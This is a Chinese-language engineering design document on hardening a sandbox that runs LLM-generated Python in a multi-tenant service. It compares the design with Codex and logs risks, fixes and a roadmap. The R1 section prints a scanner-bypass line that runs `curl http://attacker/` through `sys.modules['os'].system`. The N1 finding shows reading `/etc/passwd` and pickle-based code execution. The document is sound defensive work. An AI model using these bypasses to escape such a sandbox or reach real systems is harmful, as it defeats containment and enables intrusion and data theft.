# python_exec 沙箱加固方案(参考 Codex 实现)

> 背景:对照 [codex沙箱学习.md](./codex沙箱学习.md) 中提炼的设计原则,评估并加固 react-base-service 的 python_exec 沙箱链路。
> 续篇(2026-10-05):[ZCode与deepseek-harness沙箱学习.md](./ZCode与deepseek-harness沙箱学习.md) 对照另外两个 harness 提取了第二轮优化项(Z1 输出直写文件 / D2 denyReason 结构化 / Z2 API 面 registry 等),其 §5.5 排期与本文路线图互补。
> 沙箱当前能力全景(能做什么/不能做什么/各防线实况)见 §一之二;§二 风险项 R1~R7 中 **P0-1(网络硬隔离)与 P0-3(Cookie 透传)已于 2026-10-03 落地**,R1 的静态扫描绕过仍存在(但可达面已被网络层封死),N2(工作目录不清理)一并修复;其余 ⚠️ 项仍未实施。
> 威胁模型前提:**react-base-service 是多用户服务端**,python 执行的代码由 LLM 生成(可能被数据/prompt 注入影响);Codex 是本地单用户 CLI。**我们的威胁模型更严苛,没有"本地用户兜底审批"这一层**,因此对硬隔离的要求高于 Codex。

---

## 一、现状:执行链路与安全模型

```
WS /react/ws → engine ReAct 循环 → tool_dispatch → meta_tools(executePythonExec)
  → 组装 multi-transport 信封(inline / cos_ref / http_ref)      service/react/internal/pyexec/python_exec.go
  → pythonexec.Execute(HTTP POST,timeout 120s,不再附 Cookie)     api/pythonexec/client.go:45
  → sandbox/server.py(ThreadingHTTPServer,0.0.0.0:8190)
      ① logId 字符白名单校验
      ② AST 静态扫描(import 白名单 + 危险调用黑名单 + dunder 限制)
      ③ run_isolated:mkdtemp 工作目录 + python -I + 最小 env + setsid
         (env 注入 OPENBLAS/OMP/MKL/NUMEXPR_NUM_THREADS=1,2026-09-30)
      ④ rlimit:CPU/AS 1G/FSIZE 64M/NPROC 128/CORE 0(NPROC 2026-09-30 由 64 放宽)
      ⑤ 60s 超时 killpg 杀整组;stdout 32M / stderr 256K 截断
  → stdout 剥 artifacts → base64 清洗 → COS 上传落库 → artifactId 回模型
```

容器加固(docker-compose.yml):非 root 用户、只读根文件系统、tmpfs /tmp 128m、mem_limit 1g、cpus 1.5;**网络隔离**:沙箱只挂 `sandbox-net`(`internal: true`,无出网路由、不可达 mysql/redis),仅 service 双网桥接(P0-1,2026-10-03)。

工作目录清理(sandbox/server.py `run_isolated`):每次执行 mkdtemp 出的一次性目录,经 try/finally 整目录 rmtree;修复前从不清理,会在 128m tmpfs 上随调用累积直至写满(N2,2026-10-03)。

**做得好的部分**(先肯定,这些都和 Codex 的做法同构):logId 白名单校验(≈Codex 的 `-D` 参数注入防御)、最小环境变量(≈Codex 的 env 白名单)、超时杀整进程组(≈kill_on_drop + 进程组)、输出截断防上下文爆炸(≈Codex 输出聚合配额)、只读根文件系统 + 非 root。

## 一之二、能力全景(2026-09-30 梳理,含与风险的对照)

> 本章是"沙箱现在能做什么"的权威清单。注意:**静态扫描声明的边界(无 os)是设计意图与第一层软防线,不是安全边界**——R1 的静态扫描绕过实测仍存在,但 P0-1 网络隔离已落地,绕过后的可达面被封死;凡标注 ⚠️ 处仍不应作为安全承诺。

### 执行能力(沙箱本体)

- Python 3.11 独立进程执行,一次性即焚:`python -I` 隔离模式 + 独立会话组 + 全新 `/tmp` 工作目录,执行之间零状态残留;
- 预装库:numpy ≥1.26 / pandas ≥2.0 / matplotlib ≥3.8(Agg 后端,内置文泉驿中文字体,中文标签不乱码);
- 标准库白名单:sys / json / math / statistics / datetime / io / base64(共 10 个根模块)。

### 引擎侧配套(python_exec meta tool 协议)

- **六种输入源**:tool_result(前序工具大结果)/ raw_json / text / expr / attachment(csv/md/txt 附件)/ http(URL);大输入走 multi-transport 信封(inline / cos_ref / http_ref)避免撑爆请求体;
- **产物管道**:图表 base64 → 引擎上传 COS + 落库 artifact 元数据 → 前端 `artifact://` URL 渲染卡片与下载;
- **大结果续读**:stdout 超预算落 resultRef,模型经 read_tool_result 分页续读,不占上下文;
- **前置探查**:inspect_data 先分析 JSON/CSV 路径结构与类型样例,模型再写针对性代码;
- **超时与指标**:沙箱 60s 超时 killpg 整组;Go 侧 120s 上限兜底;超时计数入 Prometheus(PythonExecTimeoutsTotal)。

### 安全模型(六层纵深,含当前实况)

| 层 | 机制 | 实况 |
|---|---|---|
| 1 请求校验 | logId 白名单 `[A-Za-z0-9_-]{1,128}` | ✅ 生效 |
| 2 AST 静态扫描 | import 白名单 + 13 个危险调用黑名单 + dunder 封禁(白名单 6 个) | ⚠️ 生效但可绕过(R1 `sys.modules["os"]` 实测通过,P1-2 补强未做) |
| 3 进程隔离 | 非 root + `-I` + 最小 env + setsid 独立进程组 | ✅ 生效 |
| 4 内核 rlimit | CPU 65s / 内存 1G / 文件 64M / NPROC 128 / core 0 | ⚠️ fail-open(R4:setrlimit 失败被吞,P1-1 未做) |
| 5 容器限制 | 只读根文件系统 / tmpfs 128m / mem 1g / cpus 1.5 + **网络隔离** | ✅ 生效;沙箱只在 `sandbox-net`(internal),不可出网、不可达 mysql/redis(P0-1 2026-10-03 落地,回归探针 `sandbox/tests/network_isolation_probe.py`) |
| 6 输出限额 | stdout 32M / stderr 256K 截断 | ✅ 生效 |

2026-09-30 新增:执行 env 注入 `OPENBLAS/OMP/MKL/NUMEXPR_NUM_THREADS=1`(容器 1.5 核,多线程 BLAS 为负优化且撞 NPROC);NPROC 64→128(按 UID 统计含常驻 server 线程,64 误伤正常 workload,见 fix(sandbox) 7b8bf25)。

### 边界(设计意图 vs 现实)

- **无网络**:白名单无 requests/urllib/socket;需要网络数据走 http 输入源由引擎侧代取。✅ 2026-10-03:R1 绕过可达 os/socket 仍成立,但 P0-1 网络隔离已落地——容器只在 internal `sandbox-net`,无出网路由、不可达 mysql/redis(回归探针 `sandbox/tests/network_isolation_probe.py`);
- **无文件系统访问**:open() 被禁、根文件系统只读,数据只能 stdin 进 / stdout+产物出。⚠️ **该边界不成立(N1)**:pandas/numpy 的读文件 API 在白名单内且静态扫描放行,实测 `pd.read_csv("/etc/passwd")` 可通过;R1 绕过后 os 读写受 rlimit/fs 约束但未封死;
- **无系统交互 / 无持久状态**:os、subprocess 不在白名单;进程即焚,跨调用共享数据只能走 resultRef/附件等引擎侧机制。

**一句话定位:专为"表格数据进、统计结果和图表出"设计的单向分析舱;能力面刻意窄。2026-10-03 起 P0-1 网络隔离落地,安全边界由网络层承担、静态扫描降级为降噪第一层;但文件读取面未封(N1)、输出洪泛可 OOM(N3)、并发治理缺失(R5)等 P1 项仍在,多租户上线前须补齐。**

## 二、已验证的风险(按严重度)

### R1【P0,网络隔离半边已修复】AST 黑名单可绕过,且沙箱容器曾无网络隔离兜底

**实测验证的绕过路径**(在 `python3 -I` 下,`os` 模块依然预加载于 `sys.modules`):

```python
import sys                      # sys 在 import 白名单内
print(sys.modules["os"].system("curl http://attacker/"))   # 全部通过 static_scan
```

- `modules` 不是 dunder 属性,不在 `ALLOWED_DUNDER_ATTRS` 检查范围内;
- `system` 不在 `FORBIDDEN_CALLS` 黑名单内;
- 静态扫描对此放行,子进程内即获得任意代码执行。

**~~而 docker-compose.yml 中 sandbox 没有任何网络隔离配置~~(2026-10-03 已修复,见 §三 P0-1 落地记录)。** 修复前沙箱与 mysql/redis/service 同在默认 bridge 网络且可出外网:一旦绕过静态扫描,模型(或注入者)即可直接打内网 MySQL/Redis、SSRF 内部服务、外传数据。**注意:静态扫描绕过本身仍未修复(R1 前半),它只是不再构成"直达内网"的后果。**

这正是 Codex 哲学的反面教材:Codex **完全不做代码静态扫描**,OS 级 `(deny default)` / seccomp 才是边界。我们现在是"软防线独自承担安全边界,硬隔离缺席"。

### R2【P0】http_ref 输入源 = 预留的模型驱动 SSRF 通道

`service/react/internal/pyexec/python_exec.go:516-533`(2026-09-30 目录重构迁移后路径,原 service/react/python_exec.go):`resolvePythonExecHTTPInput` 把模型给的任意 http(s) URL 仅做格式校验后组成 `http_ref` 信封发给沙箱"自动拉取"。当前 server.py 尚未实现拉取(信封只透传给 stdin),但**协议已开**:未来任何一侧实现该拉取,即成 SSRF;且当前 URL 已能进入沙箱进程的可见数据中。

### R3【P0,2026-10-03 已修复】用户 Cookie 透传给沙箱

`service/react/internal/pyexec/python_exec.go:151`(迁移后行号) 把上游用户 Cookie 原样发给 sandbox(协议里有 `cookies` 字段,server.py 收到但不用)。沙箱完全不需要 Cookie;一旦 http_ref 拉取被实现,Cookie 可能随行外泄;同时 Cookie 会出现在沙箱日志/错误信息的暴露面上。

**修复(2026-10-03)**:删除 `pythonexec.ExecuteRequest.Cookies` 字段与 `api/pythonexec/client.go` 的 `Cookie` 请求头;`python_exec.go` 不再构造透传;`sandbox/server.py` 在解析请求体后显式 `req.pop("cookies", None)`(协议文档同步标注该字段废弃)。回归测试 `TestExecuteDoesNotForwardCookies` 断言上游带 Cookie 时出站请求头无 Cookie、请求体无 `cookies` 字段。

### R4【P1】fail-open 的资源限制

`sandbox/server.py:130-134`:`resource.setrlimit` 失败被 `except Exception: pass` 吞掉。Codex 的对应做法是任何加固步骤失败即拒绝执行(fail-closed:Landlock `NotEnforced` 报错、capget 断言失败拒绝执行)。我们的 rlimit 一旦设置失败,进程将以无限制状态运行,而日志毫无痕迹。

### R5【P1】无并发治理

- server.py `ThreadingHTTPServer` 每请求一线程 + 每请求一个子进程,无全局并发/速率上限;
- Go 侧 timeout 120s > 沙箱 60s,窗口内可堆积;`retry:1` 使失败请求还会再打一次;
- 单容器 1.5 CPU / 1G 内存被所有 caller 共享,无 per-caller 配额,存在"DoS 邻居"与排队饥饿问题。

### R6【P1】沙箱本体零测试

server.py 没有任何测试。AST 扫描这类"黑名单必须持续正确"的逻辑,恰恰最需要"已知绕过尝试必须被拒绝"的回归集。Codex 的 seatbelt 测试(116KB)就是真实执行断言被拒的行为测试。

### 本次复评新增发现(2026-10-03,含 N2 修复)

对 `server.py` 做实测复评(逐条构造载荷跑 `static_scan`)时新发现 4 项;N2 已随本次修复,其余登记待排期:

| # | 严重度 | 问题 | 状态 |
|---|---|---|---|
| N1 | P1 | **"无文件系统访问"边界不成立**:`open()` 被黑名单拦住,但白名单内的 pandas/numpy 读文件 API 全部放行(实测 `pd.read_csv("/etc/passwd")`、`pd.read_pickle`、`np.load(allow_pickle=True)`、`pd.read_excel` 均通过静态扫描)。其中 `read_pickle`/`allow_pickle=True` 是标准反序列化 RCE 面 | 未修复 |
| N2 | P1 | **工作目录从不清理**:`run_isolated` 每次 `mkdtemp`,全文无 `rmtree`;128m tmpfs 随调用累积直至写满,沙箱整体不可用(**必然发生,不需要攻击者**) | ✅ 本次已修复 |
| N3 | P1 | **输出限额是装饰性的**:`subprocess.communicate()` 先把 stdout/stderr 全量读进内存、之后才截断到 32M;**`RLIMIT_FSIZE` 只管普通文件、管不到管道**,脚本循环 print 可 OOM 沙箱容器,而"限制"看起来仍在 | 未修复 |
| N4 | P2 | **拒绝无法结构化识别**:`_send_failure` 走 `_send_json(200, 0, "ok", ...)`,静态扫描拒绝与"脚本自身报错退出"在 HTTP 状态码/`code` 上完全一致,Go 侧只能靠 stderr 文本猜——§三 P2-3 想要的 `denyReason` 打点因此无数据可依 | 未修复 |

N2 修复方式:`run_isolated` 拆为薄壳(负责 `mkdtemp` + `finally: rmtree`)+ `_run_in_workdir`(实际执行体),覆盖正常返回/启动失败/超时全部路径。实测:执行中 `/tmp/sandbox-*` = 1,执行后 = 0,`/tmp` 占用 0%。

### R7【P2,沙箱外但更紧急】免鉴权与凭证问题

与本主题相关但属服务边界:`middleware/auth.go` 信任 `X-User-Name` 头可伪造;`conf/mount/custom.yaml` 提交了真实 mcpgw 凭证;mcpadmin 空配置时 fail-open。这些不属于沙箱,但决定了"谁能触发沙箱",在此一并登记。

## 三、优化方案

### P0-1 沙箱网络硬隔离(✅ 2026-10-03 已落地,改造成本最低收益最大)

**Codex 原则映射**:默认全拒 + 纵深防御——静态扫描降级为"减少噪声的第一层",OS/网络层才是边界。

**落地**(docker-compose.yml):

```yaml
networks:
  backend:        # mysql/redis/service 之间
  sandbox-net:
    internal: true   # 无出网路由,不可达外网

services:
  sandbox:
    networks: [sandbox-net]        # 只在隔离网络——mysql/redis 不可达、外网不可达
    # 删除 ports 映射(internal 网络不支持宿主端口映射)
  service:
    networks: [backend, sandbox-net]   # service 桥接两网,仍可调 sandbox:8190
  mysql:
    networks: [backend]
  redis:
    networks: [backend]
```

要点:
- sandbox 的 healthcheck 用 `127.0.0.1:8190` 自检,不受影响;
- 本地开发(`go run` 直连 `127.0.0.1:18190`)改为 `docker compose exec` / 端口发布 profile,或本地直接 `python sandbox/server.py` 裸跑(本机开发本就非多租户威胁面);
- K8s 部署时对应做法:sandbox Pod 出 `NetworkPolicy` 默认 deny egress + 仅允许来自 service 的 ingress;
- **加一个验证手段**:部署后跑一次 R1 的绕过 PoC,断言 `curl`/内网连接失败——把"隔离生效"变成可回归的检查。

**落地记录(2026-10-03)**:

- `docker-compose.yml` 新增两张网:`backend`(常规,可出网)与 `sandbox-net`(`internal: true`);`sandbox` 只挂 `sandbox-net` 且删除 `ports` 映射;`service` 双网桥接;mysql/redis/minio/searxng 与监控组件全部 `backend`(故沙箱不可达它们);
- 本机开发直连改走覆盖层 `docker-compose.dev.yml`(把 sandbox 接回 `backend` 并发布 18190),`dev.sh` 默认叠加。**发布形态(不含覆盖层)保持隔离**,`deploy.yml` 的 `docker compose up -d --build` 无需改动;
- 验证手段落地为可执行探针 `sandbox/tests/network_isolation_probe.py`(非一次性 PoC):先用 R1 绕过通过静态扫描(**断言 1**,确保测的是硬边界而非软防线),再断言公网 1.1.1.1:443 与内网 mysql:3306 / redis:6379 均不可达(**断言 2**;按异常类型区分——`ConnectionRefused` 也算"可达",避免把"端口没开"误判成"隔离生效")。运行:`docker compose exec -T sandbox python - < sandbox/tests/network_isolation_probe.py`;
- **双向实测**:隔离形态 → 三项全部 BLOCKED、退出码 0;对照组(叠加 dev 覆盖层) → 三项全部 OK-CONNECTED、退出码 1,证明探针有判别力、不是橡皮图章。同时确认 service 侧主路径未被破坏(`sandbox:8190/health` 在 `sandbox-net` 内正常应答;仅 `backend` 网内解析不到 sandbox)。

### P0-2 关闭或收敛 http_ref

推荐二选一(按业务需要):
- **A(简单彻底)**:删除 `pythonExecInputSourceHTTP` 输入源与 `resolvePythonExecHTTPInput`,模型描述同步更新;需要外部数据的场景走已有 attachment/cos_ref 通道(后端拉取、有归属校验)。
- **B(保留能力)**:改为**后端预拉取**——Go 侧下载 URL 内容(带 SSRF 校验:拒绝私网/环回字面量 + 解析后 IP 校验防 DNS rebinding + 响应大小上限),以 inline 方式喂给沙箱;沙箱侧永远不发起网络请求。这与 Codex 的 managed proxy 思路一致:**出口收敛到一个受控组件,而不是让最不可信的环境(沙箱)自己拉数据**。

无论 A/B,server.py 协议层面应显式忽略/拒绝 `http_ref` kind,不留给未来实现者"顺手支持"的空间。

### P0-3 移除 Cookie 透传(✅ 2026-10-03 已落地,见 §二 R3 修复记录)

- 删除 `service/react/internal/pyexec/python_exec.go:151` 的 `Cookies` 字段与 `api/pythonexec/client.go` 的 Cookie 请求头;沙箱协议里的 `cookies` 字段标记 deprecated 并在 server.py 显式忽略;
- 业务 HTTP 工具的 Cookie 透传(`service/tool/executor.go`)单独评估:注册 URL 白名单制 + 按工具配置是否携带凭证(最小权限),不在本次沙箱范围展开。

### P1-1 fail-closed 改造(server.py)

```python
def _apply_limits() -> None:   # preexec_fn 中失败只能 os._exit,不能静默
    ...
    for which, value in limits:
        try:
            resource.setrlimit(which, value)
        except Exception as exc:
            os.write(2, f"sandbox: setrlimit {which} failed: {exc}\n".encode())
            os._exit(99)       # 拒绝执行,而不是无限制运行
```

配套:
- `resource is None`(Windows/非 Unix)时,`run_isolated` 直接返回 `sandbox spawn failed: rlimit unsupported`——不支持就拒绝,不降级;
- `static_scan` 中 `ast.parse` 的 except 保持拒绝(已正确);补一条:扫描器自身抛出的任何未预期异常也应按拒绝处理(把 `static_scan` 调用包进 `except Exception → reject`,扫描器崩溃不能 fail-open)。

### P1-2 AST 扫描补强(提高绕过成本,但不作为安全边界)

在 P0-1 落地的前提下,静态扫描的价值变成"快速反馈 + 降低噪声"。针对性补丁:

1. **属性级精准白名单**:`sys` 仅允许 `stdin/stdout/stderr/argv`(读信封需要 stdin);显式拒绝 `sys.modules`、`sys.path`、`sys._getframe`、`sys.builtin_module_names` 等逃逸入口;
2. **禁子模块钻营**:白名单校验改校验完整模块路径第一段的同时,拒绝 `pandas.io.sas` 等已知含惰性危险能力的子路径(出现一个封一个,黑名单兜底用);
3. **禁动态导入面**:已禁 `__import__`/`eval`/`exec`/`getattr`,补充禁 `importlib`(不在白名单已天然覆盖)、`builtins`(同前)、以及任何对 `__loader__`/`__spec__` 的访问(dunder 检查已覆盖,确认即可);
4. **把 R1 的 PoC 写进回归测试**(见 P1-4)。

### P1-3 并发治理与资源公平

- server.py:进程内 `threading.Semaphore(SANDBOX_MAX_CONCURRENT, 默认 2~4)`,超限快速返回 `busy`(带 Retry-After 语义),防止容器内存被排队线程+子进程吃满;
- Go 侧:`executePythonExec` 加 caller 级限流(与工具并发上限共用 `ConcurrentSafe=false` 语义,当前已是串行,确认不被并行路径绕过);`retry:1` 对 python_exec 关闭(代码执行是幂等性未知的重活,失败让模型自己决定重写代码);
- 指标:增加 `sandbox_busy_total`、排队等待时长打点,与现有 `PythonExecTimeoutsTotal` 并列。

### P1-4 沙箱测试补齐

- 为 server.py 建 pytest(`sandbox/tests/`):
  - **拒绝回归集**:R1 PoC(`sys.modules['os']`)、相对导入、dunder 访问、forbidden 调用、logId 非法字符——每个已知绕过一个用例,新绕过第一时间进集;
  - **行为集**:超时 killpg 生效、rlimit 实际生效(子进程内 `resource.getrlimit` 断言)、stdout/stderr 截断、8MB body 上限、并发信号量;
  - **隔离集**(依赖 P0-1):沙箱内尝试 `socket.create_connection` 到内网地址,断言失败——对应 Codex "真实执行并断言被拒" 的测试哲学;
- 接入 CI(现有 `ci.yml` Build+Vet+Test 加一个 job 跑 sandbox 测试)。

### P2-1 策略即数据(借鉴 PermissionProfile)

把沙箱安全参数从环境变量散置(SANDBOX_TIMEOUT_SEC/MEM_LIMIT_MB/…)收敛为一个 **profile JSON**,由 Go 侧按 caller/run 类型下发,server.py 按 profile 执行并回显指纹:

```json
{
  "profile": "default",
  "timeout_sec": 60, "mem_mb": 1024, "max_concurrent": 2,
  "stdout_mb": 32, "import_roots": ["sys", "json", "pandas", "numpy", "matplotlib", "..."],
  "network": "denied"
}
```

价值:不同 caller 差异化限额、策略可 diff 可审计、响应里带 profile 指纹便于排障——对应 Codex `--permission-profile <JSON>` + `sandbox-summary` 的做法。

### P2-2 python_exec 纳入审批流(借鉴 AskForApproval 闭环)

现状:python_exec 是 meta tool,不走 `tool_confirm`(该门只拦 http/mcp 工具)。Codex 的模式是"沙箱内尝试失败 → 识别拒绝 → 审批 → 提权"。我们可复用该交互做**反向审批**:
- 默认 `auto` 执行(保持体验);
- 高敏 caller/run 类型(如 reflection、外部租户)配 `confirm_risky`,风险正则命中(`requests`/`urllib` 字样、超大输入、长代码)时走既有 `tool_confirm_request` WS 确认流;
- `resolveEffectiveToolPermission` 的"agent 级只能收紧"原则保持不变;顺手修复 `tool_confirm.go:77-85` 的未知模式 fail-open → fail-closed。

### P2-3 拒绝识别与可观测性(借鉴 denial.rs / violation.rs)

- server.py 返回的 `stderr` 中区分:`static_rejected / limit_hit / timed_out / runtime_error` 四类 `denyReason` 字段(现在只能靠 stderr 文本猜);
- Go 侧按 `denyReason` 分别打点 `sandbox_static_rejected_total / sandbox_limit_total / sandbox_timeout_total`,模型提示词可针对 static_rejected 给出白名单引导(当前已有,保持);
- 对应 Codex `sandbox_tags` 的教训:这些标签只用于诊断/遥测,**不得**参与任何鉴权判断。

### P2-4 架构演进(中期)

单容器 fork 模型在"多租户 + 不可信代码"下的天花板:内核攻击面共享、逃逸即全容器沦陷、故障爆炸半径大。演进路径按成本递增:
1. **当前模型 + 网络隔离**(P0-1)已覆盖主要风险;
2. **gVisor(runsc) runtime**:compose/K8s 给 sandbox 容器换 runtime,拦截系统调用层,内核攻击面大幅收窄,改造成本低(一行 runtime 配置);
3. **每请求容器 / 容器池**:K8s Job 或预热容器池(对照 Codex "每次全新生成 argv、不池化"的简单性取舍:我们多租户下隔离优先级高于延迟);
4. Firecracker/microVM:仅当出现真正不可信租户时再考虑。

## 四、落地路线图

| 阶段 | 内容 | 改动面 |
|---|---|---|
| 第一周 | ~~P0-1 网络隔离 + 部署后 PoC 验证~~(✅ 2026-10-03,验证固化为 `sandbox/tests/network_isolation_probe.py`);~~P0-3 移除 Cookie~~(✅ 2026-10-03);**P0-2 http_ref 处置仍待做** | compose/internal/pyexec/python_exec.go/client.go,不动 server.py 协议主体 |
| 第二周 | ~~N2 工作目录清理~~(✅ 2026-10-03);P1-1 fail-closed;P1-2 AST 补强;P1-4 测试补齐(含回归集);N1 收敛文件读取面 | server.py + 新增 tests |
| 第三周 | P1-3 并发治理;P2-3 denyReason 分类打点 | server.py + metrics |
| 第四周起 | P2-1 profile 化;P2-2 审批接入;评估 gVisor | 按业务节奏 |

R7(鉴权/凭证)建议独立排期,**优先级不低于本方案**——它决定"谁能把代码送进沙箱"。

## 五、不建议照搬 Codex 的部分

1. **不照搬"无静态扫描"**:Codex 面向本地开发者(用户可看屏幕、可审批),我们面向服务端多租户;AST 扫描虽软,但成本低、能拦住"模型误用"这类高频低危行为,保留为第一层。
2. **不照搬"审批后提权到无沙箱重跑"**:服务端没有可信人工审批者;我们的对应物是 P2-2 的反向审批(高危先确认),而非提权。
3. **不引入 shell 常驻 + 逐 exec 提权**(shell-escalation):我们的执行粒度是整段脚本,不存在"shell 内单条 exec 升级"的需求。
4. **暂不需要 RLIMIT_NPROC 之外的 pid namespace 级治理**:Codex 用 pid namespace 治理进程;我们容器内单请求子进程 + killpg 已够,容器本身已是进程边界。
